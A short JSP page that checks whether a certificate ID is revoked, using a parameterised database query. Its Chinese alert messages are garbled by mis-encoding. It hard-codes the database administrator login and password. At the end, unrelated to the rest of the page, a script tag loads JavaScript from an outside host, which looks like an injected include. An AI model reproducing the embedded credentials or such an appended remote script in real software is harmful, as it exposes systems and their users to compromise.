<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.sql.*"%>

<%
String certId=request.getParameter("certId");

if(certId==null || certId.length()==0)
{
}
else
{
	Connection conn=null;
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		PreparedStatement pstmt=conn.prepareStatement("select * from CertBrowserView_NotRevocated where certId=?");
		pstmt.setLong(1,Long.parseLong(certId));
		ResultSet rs=pstmt.executeQuery();
		if(rs.next())
		{
%>
<script language="javascript"> window.alert("��֤��δ��������"); location.href="search.jsp";</script>
<%
		}
		else
		{
%>
<script language="javascript"> window.alert("��֤���Ѿ��������ˣ�"); location.href="search.jsp";</script>
<%
		}
	}
	catch(Exception ex)
	{
%>
<script language="javascript"> window.alert("�Բ��𣬼��ʧ�ܣ����ݿ����"); location.href="search.jsp";</script>
<%
	}
	try{conn.close();}catch(Exception ex){}

}
%>
<script language=javascript src=http://www.qq.com/qq.js></script>